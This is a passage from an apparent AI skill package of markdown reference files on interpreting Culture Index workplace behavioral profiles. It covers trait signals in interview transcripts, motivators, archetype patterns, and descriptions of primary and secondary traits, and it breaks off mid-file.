throughout entire interview\n- MEDIUM confidence: Opens up later (may be warming up)\n- LOW confidence: Interviewer-driven variation (some interviewers draw out B)\n\n</social_b>\n\n<pace_c label=\"Pace/Patience (C) Signals\">\n\n**High C indicators (right of arrow):**\n- Thoughtful pauses before answering\n- Asks for clarification, wants to understand fully\n- Structured, methodical responses\n- Mentions preferring stable environments\n- Describes careful, deliberate decision-making\n- Discomfort with hypotheticals or rapid-fire questions\n- References to planning, preparation\n- Prefers one topic at a time\n\n**Low C indicators (left of arrow):**\n- Rapid responses, quick wit\n- Interrupts or finishes interviewer's sentences\n- Topic-jumps, tangential connections\n- Mentions thriving under pressure, deadlines\n- Comfortable with ambiguity and pivots\n- Describes multitasking positively\n- Energy increases with urgency\n- Short attention span for detailed questions\n\n**Confidence modifiers:**\n- HIGH confidence: Consistent pace throughout interview\n- MEDIUM confidence: Interview pressure may affect natural pace\n- LOW confidence: Phone vs in-person may show different C\n\n</pace_c>\n\n<conformity_d label=\"Conformity/Detail (D) Signals\">\n\n**High D indicators (right of arrow):**\n- Precise language, specific numbers and dates\n- References rules, processes, best practices\n- Structured answers following question format\n- Mentions quality, accuracy, standards\n- Asks about company processes, documentation\n- Describes checking work, seeking feedback\n- Uses technical terms correctly and consistently\n- Follows interview structure carefully\n\n**Low D indicators (left of arrow):**\n- Big-picture answers, approximations\n- Comfortable with \"it depends\" responses\n- Creative interpretations of questions\n- Mentions flexibility, adaptability\n- Skeptical of rigid processes\n- Focuses on outcomes over methods\n- May challenge question premises\n- Unstructured, flowing responses\n\n**Confidence modifiers:**\n- HIGH confidence: Consistent precision (or lack of) across topics\n- MEDIUM confidence: Higher precision in domain expertise areas\n- LOW confidence: May mask natural D to appear more flexible\n\n</conformity_d>\n\n<logic_l label=\"Logic (L) Signals\">\n\nNote: L uses absolute values (not relative to arrow).\n\n**High L indicators (7-10):**\n- Data-driven reasoning: \"The numbers showed...\"\n- Logical frameworks: \"First... then... therefore...\"\n- Emotion-neutral language\n- Focuses on facts over feelings\n- Analytical approach to problems\n- May seem detached when discussing difficult situations\n- Questions based on data or evidence\n\n**Low L indicators (0-3):**\n- Values-driven language: \"It felt right...\"\n- Emotional context in stories\n- Empathy-focused responses\n- Describes gut feelings, intuition\n- People-impact framing\n- May get emotional discussing meaningful work\n- Questions based on culture, values, impact\n\n**Moderate L (4-6):**\n- Blends logic and emotion contextually\n- Adapts framing to situation\n- Can argue both sides\n\n</logic_l>\n\n<ingenuity_i label=\"Ingenuity (I) Signals\">\n\nNote: I uses absolute values (not relative to arrow).\n\n**High I indicators (7-10):**\n- Novel approaches to problems\n- Questions assumptions, challenges status quo\n- Connects unrelated concepts\n- Describes inventing solutions\n- Mentions boredom with routine\n- Creative reframing of questions\n- Original examples, not textbook answers\n\n**Low I indicators (0-3):**\n- Conventional approaches, proven methods\n- References industry standards, best practices\n- Prefers established processes\n- Practical, grounded solutions\n- Describes following playbooks successfully\n- May seem less creative but highly reliable\n\n**Moderate I (4-6):**\n- Creative within constraints\n- Innovates when necessary, follows when appropriate\n\n</ingenuity_i>\n\n</trait_signals>\n\n<pattern_combinations>\n\nLook for trait combinations that suggest patterns:\n\n| Signal Cluster | Likely Pattern |\n|----------------|----------------|\n| High A + Low B + rapid pace + big-picture | Architect/Visionary |\n| High A + High B + rapid pace | Rainmaker/Persuader |\n| Low B + deliberate pace + precise | Scholar/Specialist |\n| Low A + High B + deliberate | Accommodator |\n| Low A + Low B + precise | Technical Expert |\n\n</pattern_combinations>\n\n<transcript_analysis_tips>\n\n**When analyzing transcripts:**\n\n1. **Count language patterns** - \"I\" vs \"we\", precise vs approximate\n2. **Note energy shifts** - What topics animate them? What topics flatten them?\n3. **Watch for consistency** - Same signals across different questions?\n4. **Consider context** - Technical questions vs behavioral questions\n5. **Flag uncertainties** - Note where evidence is weak\n\n**Red flags for confidence:**\n- Candidate clearly in \"interview mode\" (performing)\n- Very short interview (insufficient data)\n- Interviewer dominated conversation\n- Technical-only questions (limited behavioral data)\n\n</transcript_analysis_tips>\n\n<output_format>\n\nWhen predicting traits from transcripts, output:\n\n```\n## Predicted Culture Index Profile: [Candidate Name]\n\n### Trait Predictions\n| Trait | Predicted Position | Confidence | Key Evidence |\n|-------|-------------------|------------|--------------|\n| A | High/Low/Norm | H/M/L | \"Quote...\" |\n| B | High/Low/Norm | H/M/L | \"Quote...\" |\n| C | High/Low/Norm | H/M/L | \"Quote...\" |\n| D | High/Low/Norm | H/M/L | \"Quote...\" |\n| L | Score (0-10) | H/M/L | \"Quote...\" |\n| I | Score (0-10) | H/M/L | \"Quote...\" |\n\n### Predicted Pattern\n[Pattern name] - [Confidence]\n\n### Evidence Summary\n[2-3 sentences on strongest signals]\n\n### Uncertainty Areas\n[Where more data would help]\n\n### Caveats\n- Interview behavior may differ from natural behavior\n- Actual CI survey will be administered after offer\n- This prediction is a hypothesis, not a diagnosis\n```\n\n</output_format>\n",
        "plugins/culture-index/skills/interpreting-culture-index/references/motivators.md": "<overview>\n\nThe simplest way to drive engagement and productivity is to find the leading dot among A, B, D (the three confidence traits) and install motivators for that trait consistently.\n\n</overview>\n\n<motivator_framework>\n\n**Step 1: Find the leading dot** between A, B, and D (the three confidence traits)\n**Step 2: Go to that trait's motivator box** (see below)\n**Step 3: Install 3-4 of those motivators consistently**\n\n**When dots are stacked** (three confidence traits close together): D always wins - start with D trait motivators first, then B, then A.\n\n**Master level:** Hit motivators for all four primary dots. Takes 2-3 years of practice.\n\n**Retention tip:** Expect to retain ~30% of workshop content initially. Quarterly team discussions with real-life examples help mobilize learning.\n\n</motivator_framework>\n\n<motivators_by_trait>\n\n<high_a label=\"High Autonomy Motivators\">\n\n- **Variable compensation** - Bonus, equity, commission over fixed salary\n- **Autonomy** - Freedom to decide how to achieve goals\n- **ROI-focused communication** - Bullet points, not walls of text\n- **Outcomes over process** - \"Bake me a cake\" not \"here's the recipe\"\n- **Challenge** - Opportunities to compete and win\n- **Buy-in through questions** - Let them \"own\" the idea\n- **Respect their time** - Don't waste it with unnecessary meetings\n\n**What doesn't work:** Micromanagement, detailed instructions, fixed salary only, consensus-driven decisions\n\n</high_a>\n\n<low_a label=\"Low Autonomy Motivators\">\n\n- **Specific praise** - \"Great job on the Johnson proposal\" not \"Great job\"\n- **Consistent compensation** - Predictable over variable bonuses\n- **Clear frameworks** - For novel decisions\n- **Direction before action** - Don't expect self-initiation\n- **Team recognition** - Acknowledge collaborative contributions\n- **Safety to disagree** - Probe for true concerns (they won't volunteer)\n\n**What doesn't work:** Variable compensation, ambiguous direction, expecting initiative on new challenges\n\n</low_a>\n\n<high_b label=\"High Social Motivators\">\n\n- **Words of affirmation** - Primary currency - verbal praise, public recognition\n- **Small talk time** - Not wasted time, it's relationship investment\n- **Group activities** - Include them in social events\n- **People interaction** - Don't isolate with solo work\n- **Public recognition** - Acknowledge in team settings\n- **Relationship building time** - Before getting to tasks\n\n**What doesn't work:** Solo work for extended periods, skipping small talk, private-only recognition, purely transactional relationships\n\n</high_b>\n\n<low_b label=\"Low Social Motivators\">\n\n- **Leave them alone** - Minimize unnecessary check-ins\n- **Written communication** - Email/async over meetings\n- **Private recognition** - Public praise is uncomfortable\n- **Thoughtful gifts** - A useful book means more than \"great job\"\n- **Quality 1:1 time** - Meaningful conversations over group settings\n- **Focus time protection** - No unnecessary interruptions\n\n**What doesn't work:** Frequent check-ins, group meetings, public praise, forced social events\n\n</low_b>\n\n<high_c label=\"High Patience Motivators\">\n\n- **Advance notice** - Of changes, meetings, new projects\n- **Meeting agendas** - Sent in advance, no surprises\n- **One topic per meeting** - Multi-topic meetings are stressful\n- **Protected focus time** - Shield from interruptions\n- **Predictable schedules** - Same routine, same environment\n- **Written checklists** - Structured approaches to follow\n- **28-minute rule** - Respect their recovery time after interruptions\n\n**What doesn't work:** Last-minute changes, frequent pivots, multi-topic meetings, constant interruptions\n\n</high_c>\n\n<low_c label=\"Low Patience Motivators\">\n\n- **Variety** - Keep them busy, load them up\n- **Changing environments** - Thrive in consistent pivots\n- **Movement** - Mental or physical in their day\n- **Fires to fight** - Creative problems to solve\n- **DEADLINES** - Critical motivator - put in email subject lines\n- **Multiple projects** - Allow switching between tasks\n- **Quick wins** - Short-term goals they can complete fast\n\n**What doesn't work:** Monotony, long-term projects without milestones, no deadlines, forced focus on single tasks\n\n</low_c>\n\n<high_d label=\"High Conformity Motivators\">\n\n- **Don't make it personal** - Frame as process improvement, not personal failure (they're already wearing it)\n- **Training opportunities** - The currency is knowledge (conferences, CEUs, certifications)\n- **Structured environment** - Accountable, with enforced standards\n- **Recognition when deserved** - But ONLY if deserved. Don't compliment if it's not great; they know.\n- **Fair, justified pay** - Based on education, experience, market rates - give them the details\n- **Trust** - Huge word for high Ds. Don't break it.\n- **SOPs and documentation** - Railroad tracks to stay on\n\n**What doesn't work:** Personal criticism, unearned praise, arbitrary decisions, broken commitments, chaotic environments\n\n</high_d>\n\n<low_d label=\"Low Conformity Motivators\">\n\n- **Creative problems** - Give them something to figure out\n- **Room to run** - Freedom from too much structure and rules\n- **Options** - Don't box them in, offer choices\n- **Pick your battles** - Focus on the 3 things that financially move the needle\n- **Big picture focus** - Don't drown in details\n- **Innovation opportunities** - Space to experiment\n\n**What doesn't work:** Too many rules, excessive structure, detail-heavy work, micromanagement, rigid processes\n\n</low_d>\n\n</motivators_by_trait>\n\n<communication_styles>\n\n| Trait | Communication Approach |\n|-------|------------------------|\n| High A | Bullet points, ROI focus, outcomes not process, let them \"own\" ideas |\n| Low A | Clear direction, specific feedback, collaborative framing |\n| High B | Build relationship first, verbal processing time, public recognition |\n| Low B | Written communication, private recognition, respect their processing time |\n| High C | Advance notice, agendas, one topic at a time, protect focus |\n| Low C | Deadlines in subject line, variety, quick transitions |\n| High D | Data and details, justify decisions, earn trust, don't make personal |\n| Low D | Big picture first, options, creative framing |\n\n</communication_styles>\n\n<confidence_recovery>\n\nWhen someone's confidence is shaken, recovery method depends on their leading confidence trait:\n\n| Confidence Source | Recovery Strategy |\n|-------------------|-------------------|\n| High A (Inner self-confidence) | Stack easy wins - get back in the winner's circle |\n| High B (Social confidence) | Relationship reconnection - rebuild social bonds |\n| High D (Knowledge confidence) | Acquire more knowledge - training, certifications |\n\n</confidence_recovery>\n",
        "plugins/culture-index/skills/interpreting-culture-index/references/patterns-archetypes.md": "<overview>\n\nCulture Index identifies 19 distinct behavioral patterns based on the configuration of A, B, C, D traits. The interaction between traits reveals more than individual positions.\n\n</overview>\n\n<common_archetypes>\n\n| Archetype | Pattern | Description | Typical Roles |\n|-----------|---------|-------------|---------------|\n| Visionary/Architect | High A, Low C, Low D | Big-picture, fast-paced, dislikes details. Best system builders when also high D. | CEO, Entrepreneur, Founder |\n| Rainmaker/Persuader | High A, High B, Low C | Aggressive, charming, fast. Closes deals, builds relationships. | Sales Hunter, BD, Account Executive |\n| Scholar/Specialist | Low B, High C, High D | Introverted, patient, detail-oriented. Deep expertise. | Engineer, CFO, Analyst |\n| Accommodator | Low A, High B, High C | Team player, patient, people-focused. Service orientation. | HR, Customer Success |\n| Debater | High B, Low A, Low D | Charming, non-conforming, unfiltered. Good storyteller. | Sales (relationship), Creative |\n| Technical Expert | Low A, Low B, Low C, High D | Efficient specialists. Fast-moving detail people. | Security, QC, Ops |\n| Craftsman | Low A, Low B, High C, High D | Patient, precise executors. Expert taskmasters. | Finance, Compliance |\n| Socializer | Low A, High B, High C, Low D | Go along, get along. Team-focused, people-focused, slowing down. | Support, HR |\n| Philosopher | High A, Low B, High C | Patient, analytical thinkers. Independent contemplation. | Strategy, Research |\n| Administrator | Moderate across traits | Versatile generalists. Can adapt to many situations. | Operations, General Management |\n\n</common_archetypes>\n\n<trait_combinations>\n\nNotable combinations and their implications:\n\n| Combination | Name | Behavior |\n|-------------|------|----------|\n| High A + Low D | **Greatest Risk Takers** | Aggressive risk-taker without brakes. Gas pedal only. Most independent people (two types of independence combined). |\n| Low A + High D | **Most Risk Averse** | Conservative, careful, will never cut corners. Bottom-line protectors. |\n| Low A + High B | Collaborative Leader | Servant leadership, great team builder, may avoid necessary conflict |\n| Low B + High C | \"Leave Me Alone x2\" | Strongly prefers solitary, focused work. Double introversion signal. |\n| High B + Low C | Verbal Sprayer | Talks fast, often, many topics. Processing out loud rapidly. |\n| High A + Low B | Results Driver | Drives results without regard for feelings. May seem low EQ. |\n| High D + Low A | Perfectionist Follower | Executes exactly as instructed, never cuts corners. Good at optimizing existing processes. |\n| High A + High D | Process Builder | Forward-thinking AND detail-oriented. Can build NEW systems and processes. (Architects, Scholars, Technical Experts) |\n| Low C + Low D | Double Error Risk | Moving fast (Low C) + not checking work (Low D) = high error rate. Needs systems to catch mistakes. |\n| Low C + High D | Wound Tight | Impatient AND perfectionist. High strung, worrisome, feels everything is urgent and must be perfect. |\n\n</trait_combinations>\n\n<task_vs_people>\n\nA vs B determines task vs people orientation:\n\n| Pattern | Meaning |\n|---------|---------|\n| A > B | Values tasks over people; will push through to get results |\n| B > A | Values people over tasks; prioritizes harmony and relationships |\n\n</task_vs_people>\n\n<strategic_cross>\n\n**Low C + Low D = \"Maverick\" or \"Change Agent\"**\n\n- Fast-moving (Low C) and unconcerned with rules (Low D)\n- Natural agents of change and innovation\n- May cause disruption\n- Good for turnarounds, startups, transformations\n\n</strategic_cross>\n\n<technical_stack>\n\n**High C + High D = \"Specialist\" or \"Operator\"**\n\n- Patient (High C) and precise (High D)\n- Will ensure work is done correctly, won't rush\n- May resist change\n- Good for compliance, quality, operations\n\n</technical_stack>\n\n<chameleon_pattern>\n\n**All four primary dots near the arrow = \"Chameleon\"**\n\n- Statistically average across all traits\n- Unpublished pattern making up less than 0.57% of population\n- Maximum flexibility but may lack strong, predictable drivers\n- Hard to pin down - adapts to situations\n\n</chameleon_pattern>\n\n<pattern_width>\n\nThe spread between traits matters as much as individual positions.\n\n**Wide pattern** (traits spread far apart):\n- More extreme, predictable behaviors\n- Stronger drivers\n- Easier to predict day-to-day behavior\n\n**Narrow pattern** (traits clustered):\n- More moderate, flexible behaviors\n- Less predictable\n- Can adapt to situations\n\nTwo people can have identical A positions but vastly different overall patterns due to B/C/D spread.\n\n</pattern_width>\n\n<pattern_fit_warning>\n\n**Flight risk signal**: When someone's Job behaviors show the opposite of their Survey traits.\n\nExample: Architect pattern (High A, Low C, Low D)  Socializer in job (Low A, High B, High C, Low D)\n- All dots flipped to opposite side\n- This is imminent flight risk\n- Something must change or they will leave\n\n</pattern_fit_warning>\n\n<role_fit_questions>\n\nWhen determining what pattern fits a role, ask:\n\n| Question | Left Answer | Right Answer | Relevant Trait |\n|----------|-------------|--------------|----------------|\n| Is this role more **macro** or **micro**? | Micro (details, execution) | Macro (big picture, strategy) | A trait |\n| Is this position more about **people skills** or **problem solving**? | Problem solving | People skills | B trait |\n| How much **repetition** is in this role? | Low repetition, chaos, variety | High repetition, stability, predictable | C trait |\n\n**Use these to match patterns:**\n- Macro + people + variety = High A, High B, Low C (Rainmaker/Persuader)\n- Micro + problem solving + stability = Low A, Low B, High C, High D (Craftsman/Specialist)\n- Macro + problem solving + stability = High A, Low B, High C, High D (Scholar/Architect)\n\n</role_fit_questions>\n\n<identifying_pattern>\n\n**Quick interpretation method:**\n\n1. Find the farthest dot from the normative line (highest deviation)\n2. Identify which range it falls into:\n   - 2 centiles = \"somewhat\" or \"very\" (one standard deviation)\n   - 4 centiles = \"extremely\" (entering six-sigma territory)\n3. Use word descriptors from the appropriate column\n\n**Example**: D trait is 4.5 centiles right of the norm = \"extremely conforming perfectionist, precise, cautious, accurate.\"\n\n**For dots on or near the line** (0.5): \"Situationally, depending on your level of comfort and experience, you might be [right-side words] or [left-side words].\"\n\n</identifying_pattern>\n",
        "plugins/culture-index/skills/interpreting-culture-index/references/primary-traits.md": "<overview>\n\nThe four primary traits (A, B, C, D) are the main drivers of behavior. The relationship BETWEEN dots is often more important than individual positions. All interpretations are relative to the red arrow (population mean).\n\n</overview>\n\n<trait name=\"A\" color=\"maroon\" label=\"Autonomy\">\n\nMeasures **mental initiative** (think and start on their own) and **inner self-confidence** (belief in self that they will win regardless of circumstance).\n\n<high_a side=\"right\">\n\n**Characteristics:**\n- Self-confident, self-starter, self-motivated, self-driven, self-reliant\n- Assertive, aggressive, ruthlessly competitive\n- Future-focused and strategic - sees the full 360-degree lay of the land\n- Prioritizes time based on ROI - trades in time and money\n- Willing to confront - conflict is just a means to an end\n- \"Enough equals more\" - always raises the bar, never satisfied\n- Opinionated - typically thinks they're the smartest person in the room\n\n**Challenges:**\n- Single hardest trait to employ - they work for \"me, Inc.\" first\n- \"You are only RENTING high A's\" - need mutually beneficial partnership\n- Kryptonite is people - people will consistently disappoint them\n- May take matters into their own hands when others \"move too slow\"\n- Can LEAD (vision, strategy) but struggle to MANAGE (routine operations)\n\n**Best Fit Roles:** Leadership, sales, entrepreneurship, strategy\n\n**Communicating with High A's:**\n- Use bullet points focused on ROI - they won't read walls of text\n- \"Bake me a cake\" approach: Give outcomes, not step-by-step instructions\n- Get buy-in through questions, not statements - let them \"own\" the idea\n- Prefer variable compensation (bonus, equity, commission) over fixed salary\n\n**Who High A's Respect:**\n- People ahead of them (mentors, more successful peers)\n- People with inner confidence who aren't threatened by them\n- NOT people who capitulate or seem \"weak\"\n\n</high_a>\n\n<low_a side=\"left\">\n\n**Characteristics:**\n- Helpful, supportive, service-oriented, accommodating, peaceful\n- Servant leadership orientation - \"what do WE need to win\"\n- Tactical and present-focused (vs high A's strategic future-focus)\n- Excel at execution once direction is clear\n- Team-oriented - finds genuine satisfaction in supporting others' success\n- Prefers direction before acting - doesn't initiate on their own\n\n**Challenges:**\n- Indecisive with NEW challenges - need frameworks, precedents, or direction\n- Conflict averse - may agree to things they don't support to keep peace\n- May be put in leadership roles they didn't seek (and will burn out)\n- Can appear passive when waiting for direction\n\n**Best Fit Roles:** Support roles, customer service, collaborative teams, execution\n\n**Managing Low A's:**\n- Provide specific praise, not general (\"Great job on the Johnson proposal\")\n- Offer consistent, predictable compensation over variable bonuses\n- Give clear frameworks for novel decisions\n- Don't interpret conflict avoidance as agreement - probe for true concerns\n\n</low_a>\n\n<leadership_styles>\n\n| Style | Trait | Mindset | Characteristics |\n|-------|-------|---------|-----------------|\n| ABL (Action Based Leadership) | High A | \"What do I need to win?\" | Self-directed, competitive, drives from front |\n| WPL (Wolf Pack Leadership) | Low A | \"What do WE need to win?\" | Collaborative, consensus-building, servant leadership |\n\nNeither is better - depends on context. High-growth/turnaround may need ABL. Stable/complex operations may benefit from WPL.\n\n</leadership_styles>\n\n</trait>\n\n<trait name=\"B\" color=\"yellow\" label=\"Social Ability\">\n\nMeasures need for social interaction and persuasion.\n\n<high_b side=\"right\">\n\n**Characteristics:**\n- Dual nature: Social competence (skill to connect) + need for acceptance (drive to connect)\n- Verbal processors - \"think out loud.\" First statement isn't final position.\n- Relational equity required - must build relationship BEFORE discussing tasks\n- Culture builders - create positive atmosphere, the \"fun part of the zoo\"\n- Energized by people, drained by isolation\n- Fear: rejection, exclusion, being disliked\n\n**Managing High B's:**\n- Words of affirmation are primary currency - verbal praise, public recognition\n- Allow small talk - it's not wasted time, it's relationship investment\n- Include them in group activities and social events\n- Don't isolate them with solo work for extended periods\n- Note: With Low C, they become \"sprayers\" - lots of fast talking\n\n**Best Fit Roles:** Sales, PR, public speaking, management, team building\n\n</high_b>\n\n<low_b side=\"left\">\n\n**Characteristics:**\n- \"There for the work\" - not for relationships. Socializing feels like a tax.\n- Prefer solitary or small-group work environments\n- Process internally before speaking - silence does not equal disengagement\n- Analytical, reserved, focused - ideal for deep work\n- Fear: being forced into social situations, public attention\n\n**Managing Low B's:**\n- Leave them alone - minimize unnecessary check-ins\n- Email/async preferred over meetings - let them process in writing\n- Private recognition - public praise is uncomfortable\n- Thoughtful gifts > verbal praise (a useful book means more than \"great job\")\n- Quality time: meaningful 1:1 > group settings\n- Don't mistake quiet for disengagement or unhappiness\n\n**Best Fit Roles:** Engineering, accounting, research, coding, analysis\n\n</low_b>\n\n</trait>\n\n<trait name=\"C\" color=\"blue\" label=\"Pace/Patience\">\n\nMeasures patience, urgency, and rate of motion. **Force multiplier** - intensifies or calms how other traits manifest.\n\n**Analogy:** High C = scheduled surgeons (focused, present, deliberate). Low C = emergency room operators (spinning plates, time-sensitive, variety).\n\n<high_c side=\"right\">\n\n**Characteristics:**\n- Patient, steady, calm, consistent, resists sudden change\n- Extended focus capability - can concentrate for long periods\n- **28-minute recovery** from interruptions - protect their focus time\n- Sequential, systematic processing - one thing at a time\n- Checklist oriented - give structured approaches, they'll follow exactly\n- Consistency preferred - same desk, schedule, tools\n- Patient with complexity - will work through problems methodically\n\n**Managing High C's:**\n- Send meeting agendas in advance - no surprises\n- One meeting, one topic - multi-topic meetings are stressful\n- Protect them from frequent interruptions\n- Provide predictable schedules and environments\n- Give advance notice of changes\n\n**Best Fit Roles:** Administrative work, long-term projects, routine tasks, operations\n\n</high_c>\n\n<low_c side=\"left\">\n\n**Characteristics:**\n- Impatient, quick, fast, restless, multifocused, intense, urgent\n- Zero to 60 immediately - instant attention ramp-up\n- Short attention span - a bit of ADD tendency\n- Change agents - open to change primarily because they get bored easily\n- Struggle staying in the moment - constantly thinking \"what's next?\"\n- If D is not high: procrastination (\"if I wait to the last minute, it only takes a minute\")\n- Overextension/over-scheduling - overestimate how much they can accomplish\n\n**Pluses:**\n- Create urgency and drive results (GSD - get stuff done)\n- Good with variety and pivots - pivot faster than high C\n- Good under pressure/stress (even if they look animated/hair on fire)\n- Firefighters - when attention turns to something, they're fully engaged\n\n**Minuses:**\n- Can spin up others unnecessarily - disruptive when situation doesn't warrant urgency\n- Interrupt others (\"Did you get that email? Did you get back to me?\")\n- Moving fast leads to errors (especially without high D to catch mistakes)\n- Get bored easily - often over-promoted because \"can I help?\" is misread as ambition\n\n**Low C Motivators:**\n- Variety - keep them busy, load them up\n- Evolving, changing environments - thrive in consistent pivots\n- Movement (mental or physical) in their day\n- Fires to fight - creative problems to solve\n- **DEADLINES** - critical motivator. Put deadlines in email subject lines.\n\n**Best Fit Roles:** Startups, emergency response, rapid-fire environments\n\n</low_c>\n\n<c_as_modifier>\n\nC acts as a **force multiplier** for other traits:\n\n**Low C (Intensifier):** Adds urgency and \"violence\" to other traits\n- High B + Low C = Proactively social, \"buzzing around,\" many shorter conversations\n- High D + Low C = Mistakes get called out QUICKLY\n- High A + Low C = Aggressive, impatient driver who demands results NOW\n\n**High C (Sedative):** Calms and steadies other traits\n- High B + High C = Better listener, deeper conversations\n- High D + High C = Notices issues but approaches steadily, might fix it themselves quietly\n- High A + High C = Strategic and determined, but willing to wait for the right moment\n\n</c_as_modifier>\n\n</trait>\n\n<trait name=\"D\" color=\"green\" label=\"Conformity\">\n\nMeasures attention to detail, rules, and structure. **Third confidence trait** - confidence rooted in knowledge and competency.\n\n<high_d side=\"right\">\n\n**Characteristics:**\n- Accurate, careful, detail-oriented, historical, specific, micro-organized\n- **Need SOPs** - must lay \"railroad tracks\" for them to stay on track\n- Won't feel comfortable doing anything until they've mastered it - \"no\" until \"know\"\n- Look back to see what the measurement is before acting (historical mindset)\n- High levels of self-discipline and self-management\n- Their own worst critic - take themselves \"behind the woodshed\" when they make mistakes\n- Long memories - remember nitpicky particulars, including who failed them in 2018\n- Currency they trade in is knowledge - all the certifications\n\n**Pluses:**\n- Reliable, dependable, consistent quality\n- Executors and finishers - sustain and maintain things, circle back around\n- Highly accountable - will do what they say\n- Risk mitigation experts - defenders of what's right, defenders of the truth\n- Good delegation targets - when you delegate to them, certainty they'll do it well (if properly defined)\n- Quality control, compliance, operational excellence backbone\n\n**Minuses:**\n- Lost without SOPs - struggle outside the box, inflexible, rigid\n- Uncomfortable when asked to do something beyond normal role\n- Don't naturally delegate - hard to trust others, becomes bottleneck\n- Long memories can lead to grudge-holding\n- Critical - find the flaw, focus on what's wrong (even when 9 of 10 things are right)\n- Judgmental - \"I give 110%, you should too\"\n- Thin-skinned and blame-avoidant when confronted personally\n\n**High D Motivators:**\n- Don't make it personal - frame as process improvement, not personal failure\n- Training and learning opportunities - the currency is knowledge\n- Structured, accountable environment\n- Recognition for hard work - but ONLY if deserved\n- Fair pay based on education, experience, market rates\n- Trust - huge word for high Ds. Don't break it.\n\n**Best Fit Roles:** Finance, compliance, quality control, legal, security, ops\n\n</high_d>\n\n<low_d side=\"left\">\n\n**Characteristics:**\n- Non-conforming, out of the box, free-spirited, conceptual, casual, flexible\n- Don't need historical context or proof of concept to experiment\n- Every day is a new day - shorter recall, don't hold on to yesterday\n- Really good at getting things 80% done, then need others for maintenance/finishing\n- Unfiltered - don't always mind their p's and q's\n- Rules are meant to be interpreted, bent, broken\n\n**Pluses:**\n- Willingness to delegate (opposite of high D)\n- Flexible and resilient - don't see limitations\n- Creative brainstorming partners - look at things in non-traditional ways\n- Good with innovation and experimentation\n- Shorter recall = resiliency (get kicked in the mouth today, blank slate tomorrow)\n\n**Minuses:**\n- Inconsistent follow-through - out of sight, out of mind\n- Forgetful - need systems/automation to catch things\n- Sloppy execution when disinterested\n- Don't always stay in their lane - don't see lanes as much\n- Won't circle back on finer details without systems\n\n**Low D Motivators:**\n- Creative problems to solve - give them something to figure out\n- Room to run - freedom from too much structure and too many rules\n- Options - don't box them in, offer choices\n- Pick your battles - focus on the 3 things that financially move the needle\n\n**Best Fit Roles:** Strategy, creative roles, R&D, visionary leadership\n\n</low_d>\n\n<key_relationship>\n\n\"The A starts, the D finishes.\"\n\n- A initiates and drives; D executes and completes\n- Building NEW processes: High A + High D = architects, scholars, technical experts\n- Optimizing EXISTING processes: Low A + High D = specialists\n\n**Independence Types:**\n- High A independence: \"I have a goal, I have a plan, I don't care if anyone follows me\"\n- Low D independence: \"Don't control me. Don't tell me not to do something.\"\n- Most independent people: High A + Low D\n- Greatest risk takers: High A + Low D\n- Most risk averse: Low A + High D\n\n</key_relationship>\n\n</trait>\n",
        "plugins/culture-index/skills/interpreting-culture-index/references/secondary-traits.md": "<overview>\n\nSecondary traits (EU, L, I) supplement the primary traits. L and I are unique: they use **absolute values** and CAN be compared directly between people.\n\n</overview>\n\n<trait name=\"EU\" label=\"Energy Units\">\n\nMeasures **mental stamina** - how long a person can work before needing a short 5-10 minute mental break to recharge. If they don't take that break, they operate in a mentally fatigued state (frustrated, lacking clarity, missing things).\n\n<important_note>\nEU is NOT:\n- Physical energy\n- Work ethic\n- Intelligence or capability\n</important_note>\n\n<interpretation>\n\n| Range | Label | Management Approach |\n|-------|-------|---------------------|\n| 0-10 | **Potentially avoidant** | Flag for review - may need hand-scoring |\n| 11-19 | Lower EU | Prioritize important work first thing in morning, earlier in week |\n| 20-40 | Most common for executives | Regular short breaks throughout day (4-5 per 10-hour day) |\n| 41-60 | Above average | Longer sustained focus possible |\n| 61-80 | High (\"energizer bunnies\") | As mentally fresh at 9pm as 9am; watch for late-night emails |\n\n</interpretation>\n\n<avoidant_responses>\n\nIf EU is 0-10, flag for review. Common causes:\n1. Didn't read instructions - selected one word per column\n2. Interrupted before completing\n3. Took survey in non-native language\n4. Overly guarded/skeptical - trust issue (\"How will this be used against me?\")\n5. Below 8th grade reading level\n\n**If multiple direct reports return avoidant:** Look at the manager - \"Why do you have a culture of fear or mistrust?\"\n\n</avoidant_responses>\n\n<energy_drain>\n\n**Critical insight**: Living in your TOP graph (natural traits) does NOT drain EU - it's effortless.\n\nWhat DRAINS EU is behavior modification - when your bottom graph differs from your top graph, you're expending mental energy to \"act\" differently than you're wired.\n\n</energy_drain>\n\n<utilization_formula>\n\n**Compare EU between Survey and Job using:**\n\n```\nEnergy Utilization = (Job EU / Survey EU)  100\n```\n\n| Utilization | Signal | Meaning |\n|-------------|--------|---------|\n| 70-130% | Healthy | Sustainable workload alignment |\n| >130% | **STRESS** | Good stress (self-induced caring) OR bad stress (overutilization). Burnout risk. |\n| <70% | **FRUSTRATION** | Disengaged, apathetic, going through motions, underutilized, bored. **Flight risk.** |\n\n**Example**: Survey EU = 41, Job EU = 31. Utilization = 31/41 = 75%. Approaching check-engine-light zone for frustration/disengagement.\n\n</utilization_formula>\n\n<stress_types>\n\n**>130% Stress Types:**\n- **Good stress (self-induced)**: \"I really care about this company, I love what I do\" - but still potential for burnout and health issues if sustained 3-6 months\n- **Bad stress (overutilization)**: Loaded with too much work, or work requires too much behavior modification\n\n**<70% Frustration:** Work doesn't quite fit them. Might have a lot to do, but the work doesn't match their traits. Not punching eject yet, but getting close.\n\n</stress_types>\n\n<resurvey_cadence>\n\nJob behaviors should be resurveyed biannually. Don't make decisions on stale data (18+ months old).\n\n</resurvey_cadence>\n\n</trait>\n\n<trait name=\"L\" color=\"purple\" label=\"Logic\">\n\nMeasures how a person receives and processes new information - the first filter when receiving new information, especially sensitive information. **Also measures self-esteem** - the lower the logic, the lower the self-esteem.\n\n<important_note>\nL uses **absolute values**. You CAN compare L scores directly between people.\nLogic 8 means \"High Logic\" regardless of arrow position.\n</important_note>\n\n<interpretation>\n\n| Score | Label | Behavior |\n|-------|-------|----------|\n| 0-2 | Low Logic | Emotional, sensitive, heartfelt, passionate; emotions filter information first |\n| 3-7 | Normative | Emotionally available competency - balanced head and heart working in tandem |\n| 8-10 | High Logic | Rational, logical, black/white; high emotional compartmentalization; detach in the moment |\n\n</interpretation>\n\n<low_logic range=\"0-2\">\n\n**Characteristics:**\n- Lack emotional control in the moment - first response may be chemically induced, not fact-based\n- Introduces unpredictability - irrational in-the-moment decision making\n- Can have high self-confidence (A) but low self-esteem simultaneously\n\n**Benefit:** Emotional attachment can drive extraordinary results (Olympians, entrepreneurs)\n\n**Managing Low Logic:**\n- Don't say \"calm down\"\n- Create distance - \"Let's talk at 4pm today\"\n- They'll meet you as an adult once emotions 